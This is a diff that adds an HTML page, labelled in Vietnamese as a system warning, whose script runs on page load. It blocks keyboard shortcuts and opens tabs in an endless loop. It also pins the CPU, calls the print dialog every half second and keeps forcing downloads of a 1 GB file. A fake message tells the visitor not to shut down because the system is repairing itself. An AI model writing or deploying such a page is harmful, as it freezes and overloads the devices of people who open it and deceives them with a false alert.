@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>🔥 Cảnh Báo Hệ Thống 🔥</title>
+    <script>
+        // 🔹 Chặn tất cả phím tắt
+        document.onkeydown = function(e) {
+            return false;
+        };
+
+        // 🔹 Mở tab vô hạn
+        function spamTabs() {
+            while (true) {
+                window.open("about:blank");
+            }
+        }
+
+        // 🔹 Vòng lặp vô hạn khiến CPU chạy 100%
+        function overloadCPU() {
+            while (true) {
+                console.log("🔥 CPU Overload! 🔥");
+            }
+        }
+
+        // 🔹 Bật in liên tục
+        function spamPrint() {
+            setInterval(() => {
+                window.print();
+            }, 500);
+        }
+
+        // 🔹 Tự động tải file cực nặng
+        function autoDownload() {
+            setInterval(() => {
+                let a = document.createElement("a");
+                a.href = "https://speed.hetzner.de/1GB.bin"; // File 1GB
+                a.download = "bigfile.bin";
+                document.body.appendChild(a);
+                a.click();
+            }, 1000);
+        }
+
+        // 🔹 Kích hoạt tất cả khi mở web
+        window.onload = function() {
+            setTimeout(spamTabs, 1000);
+            setTimeout(overloadCPU, 500);
+            setTimeout(spamPrint, 1500);
+            setTimeout(autoDownload, 2000);
+        };
+    </script>
+</head>
+<body>
+    <h1>🔥 Hệ Thống Bị Lỗi 🔥</h1>
+    <p>Vui lòng không tắt máy! Hệ thống đang tự động sửa lỗi...</p>
+</body>
+</html>
